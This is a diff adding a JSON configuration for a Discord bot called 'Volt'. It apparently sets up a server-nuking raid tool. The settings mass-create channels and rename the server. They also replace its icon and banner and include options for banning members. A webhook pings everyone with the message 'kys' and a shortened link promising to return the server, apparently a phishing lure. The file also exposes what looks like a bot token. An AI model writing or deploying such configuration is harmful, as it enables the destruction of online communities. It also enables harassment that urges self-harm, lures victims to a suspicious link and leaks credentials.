@@ -1,0 +1,35 @@
+{
+    "token": "MTE1NTEzOTkwOTg1ODkwMjAzNw.GeLthH.u0dWYTYzCCTaRPijPtF5r85AG1QR3CUpok_cxI", 
+    "clientID": "1155139909858902037", 
+    "admins": ["1137704471154143354"], 
+    "botName": "Volt", 
+    "fakeServers": "72", 
+    "advancedOptions": {  
+
+        "enabled": true, 
+
+        "channels": {
+            "channelNames": "769", 
+            "amount": 36
+        },
+
+        "webhook": {
+            "name": ".", 
+            "avatar": "https://i.pinimg.com/564x/9b/96/76/9b967650d02aee8b80a0a409565c7c54.jpg", 
+            "message": "@everyone kys\n\n> **If you want to have your server back click [here](<https://pnrtscr.com/kqrkc7>)**" 
+        },
+
+        "banning": {
+            "enabled": false, 
+            "banReason": "Lmao" 
+        },
+
+        "server": {
+            "nameChange": "769", 
+            "iconChange": "https://stormempire.netlify.app/pfps/3515.jpg",
+            "bannerChange": "https://i.pinimg.com/564x/9b/96/76/9b967650d02aee8b80a0a409565c7c54.jpg" 
+        }
+        
+    }
+}
+
